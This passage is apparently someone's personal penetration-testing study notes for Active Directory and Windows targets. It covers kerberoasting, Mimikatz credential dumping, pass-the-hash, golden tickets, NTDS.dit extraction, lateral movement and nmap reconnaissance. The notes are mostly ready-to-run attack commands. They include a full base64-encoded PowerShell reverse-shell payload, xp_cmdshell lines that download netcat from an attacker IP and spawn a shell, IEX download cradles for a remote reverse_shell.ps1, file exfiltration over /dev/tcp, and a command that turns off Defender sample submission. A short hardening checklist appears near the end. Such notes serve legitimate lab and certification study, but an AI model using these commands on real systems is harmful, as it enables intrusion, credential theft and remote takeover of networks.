Set-ADUser -Identity "pete" -Add @{ServicePrincipalName="HTTP/pete.corp.com"}    # PS Targets kerberoasting - IF you have permissive ACE on a user then you could add an SN to their account to do Targeted Kerberoasting on the TGS
```

```sh
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName 

dn:  N=Administrator,CN=Users,DC=active,DC=htb 
servicePrincipalName: active/CIFS:445
```
- `ldapsearch -H "ldap://10.129.215.226" -x -s base namingcontexts`
- `ldapsearch -H "ldap://10.129.215.226" -x -b 'DC=cascade,DC=local' > tmp`
- `cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr | grep : ` this will give us all the unique values 
This was interesting : "cascadeLegacyPwd: clk0bjVldmE=" -> base64 -d == "rY4n5eva" ???

**Bruteforce password sparay**
- `kerbrute passwordspray -dc <TARGET_IP> -d <DOMAIN_NAME> <USERNAME_FILE> <PASSWORD_TO_TRY>`
- `kerbrute passwordspray -dc 10.10.10.10 -d bbc.com /UserNameFile.txt PAssw0rd!`
- Verify with crackmapexec 
  - `crackmapexec smb 10.10.10.10 -u TheBoss -p 'Passw0rd!`


### Mimikatz
- [Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
Requires Administrator Privs.
Modules help can be access by typing just `::` at the end of their name. Modules are:
- `standard`
- `privilege`
- `crypto`
- `sekurlsa`
- `kerberos`
- `lsadump`
- `vault`
- `token`
- `event`
- `ts`
- `process`
- `service`
- `net`
- `misc`
- `library` mimilib
- `driver` mimidrv

**Get Local Users NTLM hash (work flow - Assumeing Mimikatz is on the machine and you have Administrator rights)** 
- Run powershell as the Administrator
- Start mimikatz `.\mimikatz.exe`
- `privilege::debug` engage the [_SeDebugPrivlege_](https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx) privilege, which will allow us to interact with a process owned by another account.
- `token::elevate` elevate to SYSTEM user. 
- `sekurlsa::logonpasswords`- to dump the credentials hashes of all logged-on users with the [_Sekurlsa_ module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
- `sekurlsa::tickets`
- `lsadump::sam` we will dump the hash

#### Mimikatz with Kerberos and ADCS
- `sekurlsa::tickets` - show the tickets that are stored in memory , nice to do after reading a smb share to get TGT as part of the interaction
- `crypto::capi` - Will patch/modify the Windows' CryptoAPI to bypass protections and extract sensitive cryptographic material.
- `crypto::cng` modify `KeyIso` service, in **LSASS** process, in order to make unexportable keys, exportable. Only useful when keys provider is Microsoft Software Key Storage Provider.

Back on your cracker
- `echo 2835573fb334e3696ef62a00e5cf7571 > victim.hash`
- `hashcat -m 1000 victim.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

## netexec (formally CrackMapExc)
```

# netexec modules for each protocol
netexec smb -L        # eg list all the modules for smb 

netexec smb 10.129.215.226 --pass-pol   # gets the password policy
netexec smb <IP_LISTFILE> -u <UN_LISTFILE> -p <PW_LISTFILE> --local-auth --continue-on-success  # lists or strings optional for Ips, Unames, Passwords
netexec smb 10.129.215.226 --shares -u usersClean.txt -p NewPW.txt  # bruteforce with list 

# list all the shares
netexec smb <IP+-ADDDRESS> --shares           # This doesnt work HOWEVER, doing an unknown user works like a guest so....
netexec smb <IP+-ADDDRESS> -u 'Random-user' -p '' --sharers 

netexec smb 192.168.1.10 -u 'guest' -p"' -M spider_plus     # spider_plus module will look for all the files availible and parse the tree of all the files and flders yo uhave access to.
netexec smb 10.129.215.226 -u r.thompson -p rY4n5eva -M spider_plus   

```
You can then run `jq` against the spider_plus output file wht something like:
- `cat / tmp/ cme__spider_plus/<ip>.json |jq '. |map_values(keys) '|`


- `netexec smb <IP+-ADDDRESS> --sharers` # This doesnt work HOWEVER, doing an unknown user works like a guest so....
- `netexec smb <IP+-ADDDRESS> -u 'Random-user' -p '' --sharers`
    - We could spider plus, but he forgot the syntax so instead he uses smbclient 


**winrm** 
```sh
┌──(kali㉿kali)-[~/…/Machines/AUTHORITY/Certipy/certipy]
└─$ crackmapexec winrm -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.218.144 -x 'type C:\USers\Administrator\Desktop\root.txt'
HTTP        10.129.218.144  5985   10.129.218.144   [*] http://10.129.218.144:5985/wsman
WINRM       10.129.218.144  5985   10.129.218.144   [+] c-ip\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
WINRM       10.129.218.144  5985   10.129.218.144   [+] Executed command
WINRM       10.129.218.144  5985   10.129.218.144   e9a1b0f28db8d8eab9c0ab064bf2f8e5
```

## Lateral movment in Active Directory

WMI and WinRM Snippets below permit lateral movement from a foothold and another users credntials to launch the reverse shell as another user on target resources they have have access to
```
PS:> New-PSSession                                                                                  # if availible ,lateral movment via WinRM in powereshell (see AD-LAt mvmnt notes)
PS:> New-CimSession                                                                                 # if availible ,lateral movment via wmic in powereshell (see AD-LAt mvmnt notes)
C:> winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e BLAH64...."                  # if availible ,lateral movment via WinRM in powereshell (see AD-LAt mvmnt notes)
C:> winrs -r:<TARGET_HOSTNAME> -u:jen -p:Nexus123! "powershell -nop -w hidden -e BLAH64...."        # if availible ,lateral movment via WinRM in powereshell (see AD-LAt mvmnt notes)
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell ...BLAH..."  # if availible ,lateral movment via WinRM in powereshell (see AD-LAt mvmnt notes)
wmic /node:<TARGET_IP> /user:jen /password:Nexus123! process call create "<CMD_TO_RUN>"            # if availible ,lateral movment via WinRM in powereshell (see AD-LAt mvmnt notes)
```
The below powershell script is an example of useing the powershell implementation of wmic for lateral movment via WinRM in powereshell.
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <TARGET_IP> -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

#### Pass the hash (PtH)
Pass the hash requires an SMB through the firewall (commonly port 445), Windows File and Printer Sharing feature to be enabled ( normally a defaul) and admin share called **ADMIN$** to be available.

```
/usr/bin/impacket-wmiexec -hashes :<NBTLM-HASH> <USERNAME>@<TARGET_IP>
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

#### Overpass the hash
[_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), goes "over" or beyond abuse NTLM to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT).

```
mimikatz # privilege::debug                   # Overpass the hash 
mimikatz # sekurlsa::logonpasswords           # Overpass the hash - Obtain all the hashes
mimikatz # sekurlsa::pth /user:<VICTIM> /domain:<DOMAIN> /ntlm:<NTLM-HASH>> /run:<UTILITY-TO-RUN>    # Overpass the hash - comand template
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell    # Overpass the hash - spawns powershell as Jen but will appaear in the context of the original user jeff
PS:> klist                                    # Overpass the hash - Notice no tickets are stored yet  
PS:> net use \\files04                        # Overpass the hash - Makes an interactice request as jen to login and cache the TGT
PS:> klist                                    # Overpass the hash - Now see some tickets are stored 
PS:> .\PsExec.exe \\<TARGET-HOSTNAME> cmd     # Overpass the hash - run a new shell with a utility that uses kerberos tickets and not NTLM
```



#### Pass the Ticket 
Pass the ticket is about reusing tickets; within the scope of the specific services the ticket is permitted for. 
```
PS C:\Tools> klist                                            # See no local tickets - Pass the ticket 
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export                          # Pass the ticket - export the tickets
mimikatz # kerberos::ptt [0;12bd0]<<<SOME-TICKET>>>.kirbi     # Pass the ticket 
PS C:\Tools> klist                                            # Pass the ticket - list our new local ticket
PS C:\Tools> ls \\web04\backup                                # Pass the ticket- access the resource
```

#### [MMC20 DCOM Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 The [_Microsoft Management Console_](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page) (MMC) COM application allows the creation of [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN). These expose the _[**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand)_ method under the _`Document.ActiveView`_ property. This allows the execution of any shell command as long as the authenticated user is authorized. The method accepts four parameters: **Command**, **Directory**, **Parameters**, and **WindowState**. We're only interested in the first and third/

DCOM exploit command structure:
```
PS:> $dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>")                                      # DCOM Lateral movment - Create our DCOM application object    
PS:> $dcom.Document.ActiveView.ExecuteShellCommand("<BINARY_TO_RUN_NAME>,$null,"<CLI_COMMAND_TO_BE_RUN>","<windows_State>")                        # DCOM Lateral movment - Run our command to 
C:\ tasklist | findstr "<UTILITY>"                # Look for started payload for verification on the target                         
```

Reverse Shell DCOM exploit command example:
```
Kali: nc -lvnp 443
PS:> $dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>")                                       # DCOM Lateral movment - Create our DCOM application object    
PS:> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG....BLAH","7")                    # DCOM Lateral movment - Run our command to launch the reverse shell
```

#### Golden Tickets
[_Golden tickets_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf). : When we can get our hands on the _krbtgt_ password hash, we can create our own self-made custom TGTs (aka Golden Tickets). Obtaining the NTLM hash of the _krbtgt_ user, we can issue domain-administrative TGTs (Golden Tickets) to any existing low-privileged account, Allowing us inconspicuous legitimate access to the entire AD domain.

```
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe                                                           # Golden Tickets - See the connection to a DC is currently denied. Expected.
mimikatz # privilege::debug 
mimikatz # lsadump::lsa /patch                                                                                  # Golden Tickets - dump all hashes inc the krbtgt and the DC SID
mimikatz # kerberos::purge                                                                                      # Golden Tickets - Clear out all existing tickets to be sure
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:<SID-VALUE>> /krbtgt:<KRBTGT-NTLM-HASH>7 /ptt       # Golden Tickets - mimikatz comand template to make a golde ticket
mimikatz # misc::cmd                                                                                            # Golden Tickets - With the ticket in memory, launch a new shell though mimikatz
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe                                                             # Golden Tickets - try accessing the resource (DC) with PSexec
```

####  Shadow copy Persistance Technique
As domain admins, we can abuse the [vshadow](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) utility to create a [Shadow Copy](https://en.wikipedia.org/wiki/Shadow_Copy) that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the [SYSTEM hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives), and then we can extract every user credential offline on our local Kali machine. Note: Could only get the copy of the whole AD Database from the shadow copy on CMD not powershell???
```
PS:> Get-ChildItem -Path C:\Tools -Filter "vshadow.exe"                                   # Shadow Copy - (PS DID NOT WORK FOR SHADOW) Search for the binary with powershell

C:> dir C:\vshadow.exe /s                                                                 # Shadow Copy - Search for the vshadow binary with cmd in the entire FS
C:\Tools>vshadow.exe -nw -p  C:                                                           # Shadow Copy - make a snapshot and obtain the name of shadow copy device  
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak      # Shadow Copy - Make a copy of the Ad database, providing a full path to the device
C:\>reg.exe save hklm\system c:\system.bak                                                               # Shadow Copy - makea copy of the system hive inorder to extract teh ad data base 
K:$> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL                                    # Shadow Copy -  with the AD db and hive on Kali, extract all the Key MAT.
```

### ssh brute 
- `cme ssh <IPADDRESS> -u user.txt -p Passwd.txt`

**MSSQL**
```
cms mssql 10.10.11.202 -u "PublicUser" -p 'GuestUserCantWrite1'                           # If this doesnt work ...
cms mssql 10.10.11.202 --local-auth -u "PublicUser" -p 'GuestUserCantWrite1'              # ....this might work.

cms mssql 10.10.11.202 --local-auth -u "PublicUser" -p 'GuestUserCantWrite1' -L            # -L will list the availible modules
cms mssql 10.10.11.202 --local-auth -u "PublicUser" -p 'GuestUserCantWrite1' -M mssql_priv #   This will show us what privs we have 


```

## Impacket

https://github.com/fortra/impacket

```sh
GetADUsers.py -all -dc-ip <IP_ADDRESS> <DOMAIN>/<USERNAME>:<PASSWORD> # simplifies the process of enumerating domain user accounts.
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100  #  lets us request the TGS and extract the hash for offline cracking.
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100 # can be used to get a shell as active\administrator , and read root.txt .
```

```
impacket-smbserver testers 'pwd'   # will create an smb server eg "\\<MY_IP_ADDRESS>\testers - shareing the pwd ( i think)

or 

sudo impacket-smbserver share ./
```
#### Powershell launch 
`python3 psexec.py administrator@{TARGET_IP}`

#### Impacket launch for sql shell
- `python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.58.104 -windows-auth`
- `mssqlclient.py USERNAME:PASSWORD@DIMAINNAME-OR-IP`
IF we then launch a locla responder with 
- `reponder -I tun0`
And then call to my responder fro mthe mssql wwe can get the sql service credential
- `)> xp_dirtree \\HACKER_IP\fake\share` - we do two things so it has a file to read
We get het Hash which we can then crack with hashcat.

#### Impacket SQL shell cmds
```sh
SQL> xp_cmdshell "powershell -c pwd"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
```
#### ticketer

```
impacket-ticketer -debug -nthash <HASH_DATA> -domain-sid <DOMAIN_SID>> -domain DOMAIN.htb -spn <USERNAME/DC.DOMAIN.htb>
```
## Evil-winrm

Gets shell with creds - TODO research

```
└─# evil-winrm -i 10.129.12.109 -u s.smith -p sT333ve2
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Documents> dir
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/16/2024   7:51 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
```
#### Upload/download tools 

```
*Evil-WinRM* PS C:\Users\ryan\Documents> upload <HOST_MACHINE_LOCAL_TOOL/FILE>
*Evil-WinRM* PS C:\Users\ryan\Documents> download <TARGET_MACHINE_LOCAL_TOOL/FILE>
```

#### cert based login (needs to be verified)
- `evil-winrm -S -c key.cert -k key.pem -i <DOMAINNAME>` - `-S` for ssl

#### Hash based login
- `evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee`





## Interesting Windows files that are worth looking at:
```
c:\windows\system32\eula.txt  
cl\windows\system32\license.rtf                     # the lisence file, will give us the year. IN rich text so could be opened in LibreOffice to read properly
c:\windows\System32\drivers\etc\hosts
c:\windows\System32\config		                    # if we can get in here may be an admin  
c:\Windows\SoftwareDistribution\Download            # where windows updates get placed. IF contains nothing , it probably has never been updated
c:\WINDOWS\win.ini    
c:\WINNT\win.ini
c:\windows\Panther\Unattend\Unattended.xml			# Dir if you do an Automated install , log files are put there
c:\windows\Panther\Unattend\UnattendGC
c:\windows\Panther\Unattended.xml
c:\windows\debug\NetSetup.log 						# May get created at install time , give info about who installed it

Password hash?  
c:\WINDOWS\Repair\SAM    
c:\WINDOWS\Repair\system
c:\WINDOWS\Repair\security
pwdump SAM system  

c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini\
c:\Windows\WindowsUpdate.log  # this file will tell us the patch level of the machine. IF its old , we could try something specific Eternal Blue
```
### Windows Misc

### Windows commands
```
(iwr -UseDefaultCredentials http://google.com).Content  #  download the source code of a webpage

```

#### Calling a nishang reverese shell
  - `powershell "IEX(New-Object Net.Web.Client).downloadString('http://SERVER_IP:PORT/shell.ps1')"` - Grab your Reverse shell with Powershell 
#### Run rev shell on powershell from encoded input
- `cat <PAYLOAD_FILE> | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard` # copy everything to UTF-16LE which is how WIndows has files formatted . See HTB NetMon - Upload trouble with ps1 payload (Below)
- `powershell -enc <ENCODED_FILEDATA>`

### Windows Antivirus
Disable sample sending on windos Defender via the powershell command
- `Set-MpPreference -SubmitSamplesConsent 2` 
Mp == Malware Protection, 2 == Never send
Or in the UI by navigating to _Windows Security_ > _Virus & threat protection_ > _Manage Settings_ and deselecting the option.

# Windows Privesc
When we get the shell on a windows machine, the first thing we run is situa ( "Rogue" potato - older and harder,  )
 - https://jlajara.gitlab.io/Potatoes_Windows_Privesc  ??? 
 - https://github.com/decoder-it/LocalPotato main potato creator and news publisher
 - His blog : https://decoder.cloud/
 - Release 2024: https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip

- Rotten Potato
  - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
  - https://www.youtube.com/watch?v=8Wjs__mWOKI
- Lonley Potato
- Juicy Potato
- Rogue POtato
- Local Pptato
- Hot Potato
- Sweet Pptato
- Generic Potato

##### If we are on the host User Bob has active session , we can get a rev shell, becasue his security context is live
`psexec -u Bob -p BobPassword -s cmd.exe /c "powershell -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/reverse_shell.ps1')"`

#### runas a victim
If we have credentials as of another user on the host , we can try to do a RunAs. With the below comand we will be promted for credentials and the na cmd prompt will open ( if we have GUI access). We could run PS, reve shell?
`runas /user:VICTIM cmd` 


### EvilMog Windows Checklist (I think) 
1. Read into the Microsoft Securing Privileged Access Whitepaper
https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access
2. Review the malware archaeology logging cheatsheets which include the ATT&CK lateral movement guide, windows and powershell sheets
https://www.malwarearchaeology.com/cheat-sheets/
3. review all posts on adsecurity.org
http://adsecurity.org/
4. learn to use bloodhound defensively, collectionmethod All includes ACL abuses, run monthly
https://posts.specterops.io/tagged/bloodhound?gi=3270315c3d6a
5. Disable LLMNR (link local multicast name resolution)
6. Disable WPAD (Windows Proxy Auto Discovery)
7. Disable NBT-NS (NetBIOS Name Services). the following powershell will do it, push via GPO
`$NetworkAdapters = (get-wmiobject win32_networkadapterconfiguration) ForEach ($NetworkAdapterItem in $NetworkAdapters) { $NetworkAdapterItem.SetTCPIPNetbios(2) }`
8. Enforce SMB Signing and disable SMBv1
9. Disable Powershell 2, enable powershell v5, deploy poweshell transcription block logging, module logging and script block logging
10. use microsoft ata (advanced threat analytics)
11. deploy PAW (privileged access workstations)
12. deploy red forest with full tier 0/1/2 isolation and Microsoft Privilege Identity Manager with dynamic privilege assignment
13. deploy local admin password solution (LAPS)-ensure all local admin passwords are different between workstations, servers and VDI's. Also remove universal local admin accounts.
14. remove local admin from users, ensure PAW's have no admin on that workstation for individual machine admins
15. deploy credential guard
16. deploy device guard
17. deploy exploit guard
18. deploy sysmon
19. deploy applocker
20. employ windows firewall blocking inbound 135-139, 389, 636 3389,445, 5985/5986 unless authentication through a VPN from managed workstations, also block these ports on internal and xternal network firewalls
21. make sure nac and va scanners don't spray creds
22. look at mimikatz protection such as rdp restricted admin mode http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png
23. secure dynamic dns updates
24. purge group policy preferences files and unattended installation files
25. change the krbtgt hash twice a year
26. ensure there are no paths from kerberoastable users to high value targets such as domain admin
27. plant honey tokens and accounts to detect anomalous activity especially against kerberoasting with an SPN set
28. enforce LDAP signing and LDAP channel binding
29. mitigate a nasty exchange bug, details are here: https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ 
    1.  There is a mitigations section, follow it completely including removing the excessive permissions
30. remove print spooler from domain controllers or sensitive servers, you can force the machines to authenticate and relay
31. follow mitigations here: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
32. Deploy Windows 10, Server 2016
33. Use the Microsoft SECCON Frameworkhttps://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-configuration-framework
34. Disable all Lanman responses in NTLM Challenges and NTLMv1 challenge response on clients and servers.

-----

## nmap


## OSCP Starting Recon Methodology
### 1. Initial Nmap Scan (Service and Port Discovery)
```
locate nse | grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse

nmap -v -p- -sC -sV -oA nmap/-p-nmap <IPADDRESS> --open

nmap -sV -sC -oA NmapResults <IPADDRESS>  		# Versions, defaults scripts , all outputs
nmap --script safe <IPADDRESS> 					# runs all the "safe" scrpts
nmap --script "vuln and safe" <IPADDRESS> 		# runs all the "vuln and safe" scrpts
nmap -sS -A -p- -T4 -oN nmap.txt <IPADDRESS> 	# Hackersploits Nmap

nmap -sS -p- -T4 target_ip          # Scan all ports with SYN scan
nmap -sV -sC -A target_ip           # Detect service versions, OS, and run default NSE scripts
```
#### Find exploits in nmap scrips
- `grep Exploits /usr/share/nmap/scripts/*.nse`

### 2. Recognizing Port Patterns and Services


### Knowing its a domain controller
**LDAP Port (389)** and **LDAPS Port (636)** are typically open on Domain Controllers DC sync .
```
nmap -p 389,636 <target_network>
telnet <target_ip> 389
nltest /dclist:<domain_name>    # PS list out the domain controller
netdom query dc
```

##### Active Directory (Windows Environment)

```
nmap --script ldap-rootdse,ldap-search target_ip    # Enumerate LDAP information
rpcclient -U "" target_ip             # Null session for RPC enumeration
enum4linux -a target_ip               # Enumerate SMB shares and users
nmap --script smb-enum-shares,smb-enum-users -p445 target_ip   # Nmap SMB enumeration
```

##### Web Servers (Apache, Nginx, IIS)

```
gobuster dir -u http://target_ip -w /path/to/wordlist.txt -t 50   # Directory brute force
whatweb target_ip                   # Web server fingerprinting
nmap --script http-enum,http-headers,http-title -p80,443 target_ip   # HTTP enumeration
```

##### FTP / File Services

```
hydra -l admin -P /path/to/wordlist.txt ftp://target_ip    # Brute-force FTP login
nmap --script ftp-anon,ftp-bounce,ftp-syst target_ip   # FTP vulnerability detection
```

##### Database Servers (MySQL, MSSQL, PostgreSQL)
```
nmap --script mysql-info,mysql-users,mysql-databases -p3306 target_ip   # MySQL enumeration
msfconsole -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS target_ip; run"   # MSSQL brute-force
sqlmap -u "http://target_ip/vulnerable_endpoint" --dbs   # SQL Injection test
```

##### Mail Servers (SMTP, IMAP, POP3)
```
nmap --script smtp-enum-users,smtp-open-relay -p25 target_ip   # Enumerate SMTP users and open relays
hydra -l user -P /path/to/wordlist.txt smtp://target_ip   # Brute-force SMTP login
```

##### RDP (Remote Desktop)
```
hydra -l admin -P /path/to/wordlist.txt rdp://target_ip   # Brute-force RDP login
nmap --script rdp-enum-encryption -p3389 target_ip   # RDP vulnerability check
```

##### Other Ports and Services

```
hydra -l root -P /path/to/wordlist.txt ssh://target_ip    # Brute-force SSH login
telnet target_ip   # Test Telnet access
dig axfr @target_ip domain_name   # DNS zone transfer check
```

### 3. Next Steps After Enumeration
```
searchsploit service_name version   # Search for public exploits
hydra -l user -P /path/to/wordlist.txt service://target_ip    # Test credentials
burpsuite   # Manual web exploitation
```

### 4. Nmap Specific Commands
```
nmap -sV -sC -oA NmapResults target_ip   # Scan services, versions, and run default scripts
nmap --script safe target_ip   # Run "safe" NSE scripts
nmap -sS -A -p- -T4 -oN nmap.txt target_ip   # Aggressive full-port scan
```

##### Find Exploits in Nmap Scripts
```
grep Exploits /usr/share/nmap/scripts/*.nse    # Search for exploit-related scripts
nmap -sV -p 443 --script "vuln" target_ip    # Run vulnerability scripts on port 443
nmap --script "discovery and safe" target_ip   # Combine discovery and safe scripts
```

##### SNMP Enumeration
```
sudo nmap -sU --open -p 161 target_range -oG open-snmp.txt    # SNMP scan on a range of IPs
```

##### LDAP Enumeration
```
nmap -n -sV --script "ldap* and not brute" target_ip   # LDAP enumeration without brute force
```


# TODO: Powershell when you don't have nmap
```
# Basic
PS C:\Users\student> Test-NetConnection -Port 445 192.168.50.151

# Looped
PS C:\Users\student> 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```


#### Nmap script lister:
```
nmap --script-help=all | grep '^[a-zA-Z0-9-]*$' | grep -v '^$' && echo -e "\nRun CMD:        nmap --script=<CURIOUS>*           : against target"
```

#### Downloading new NSE scrips and updateing the scripts db

```
# FIRST Download a script from the interenet ( MAKE SURE ITS SAFFE AND LEGIT FIRST)
# Then....
sudo cp <SCRIPT>.nse /usr/share/nmap/scripts/<SCRIPT>.nse
sudo nmap --script-updatedb

```
### Scan for local ips with bash on port 445

`for i in $(seq 1 254); do nc -zv -w 1 172.16.162.$i 445; done`

----

## Curl
- `curl -v http://<IP_ADDRESS>` # Basic call on a site
- `curl -O 138.68.182.130:30775/download.php` # Download a file with curl
- `curl -I https://www.inlanefreight.com` # Only display the response headers. 
- `curl www.bbc.com --proxy 127.0.0.1:8080`   # Send via a proxy eg Burp
- `curl -T myfile.txt http://192.168.45.180/` transfer a file to the host

## Send and recive from victim to attacker ( some ways)
- `cat <SOMELARGE_ZIP> > /dev/tcp/10.10.14.93/9001`
- `nc -lvnp 9001 > <SOMELARGE_ZIP>`


## netcat
IF you have an open port y oucan try probeing with netcat
- `nc -zvv <IP_ADDRESS> <PORT>`

```
# TCP Port Scan
